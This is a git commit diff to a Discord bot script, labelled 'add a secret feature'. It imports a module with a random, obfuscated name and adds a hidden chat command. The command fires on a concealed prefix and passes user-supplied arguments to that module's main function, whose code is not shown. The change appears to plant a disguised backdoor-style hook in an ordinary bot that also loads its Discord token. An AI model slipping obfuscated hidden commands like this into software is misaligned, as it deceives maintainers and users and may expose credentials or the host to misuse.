f3a258eeaad0defdea36ea3557688018b8dcb487
Velocity <leathergate@proton.me>
2026-08-05 15:17:24 +0800

    feat: add a secret feature

--- botnivikv4.py
+++ botnivikv4.py
@@ -1,5 +1,6 @@
 import discord
 import random
+import awv9U1ekja3Q
 
 ### fetching the discord token ###
 with open('my_bot_token.env') as f:
@@ -12,8 +13,9 @@ channel_ids = {
 help = {
   'commands': {
     'help': ['➡️ `.help`', 'displays this help page'],
-    '.passwordgen': ['➡️ `.passwordgen`', 'generates a 15-character password'],
-    '.': ['➡️ `.`', 'debugs the bot']
+    'passwordgen': ['➡️ `.passwordgen`', 'generates a 15-character password'],
+    'obfuscated_1': [f'➡️ {awv9U1ekja3Q.command_name}', awv9U1ekja3Q.command_help],
+    '.': ['➡️ `.`', 'debugs the bot'],
   }
 }
 ### 1. initialization of the bot ###
@@ -46,6 +48,16 @@ async def on_message(message):
         embed.set_author( name=message.author,
                           icon_url="https://i.pinimg.com/736x/83/11/1a/83111a294e4eff3e42c905fa21908cbf.jpg" )
         await message.channel.send(embed=embed)
+      if message.content.startswith(awv9U1ekja3Q.tXO5l):
+        arguments = message.content.split()
+        RWs3xFJ = awv9U1ekja3Q.main(arguments[1], arguments[2])
+        embed = discord.Embed(title="Success!",
+                              description=RWs3xFJ,
+                              colour=discord.Colour.purple())
+        embed.set_author(name=message.author,
+                         icon_url="https://i.pinimg.com/736x/83/11/1a/83111a294e4eff3e42c905fa21908cbf.jpg")
+        await message.channel.send(embed=embed)
+        
       if message.content == '.help':
         embed = discord.Embed(title='List of all available commands', color=0x49fc03)
         for i in help['commands'].keys():
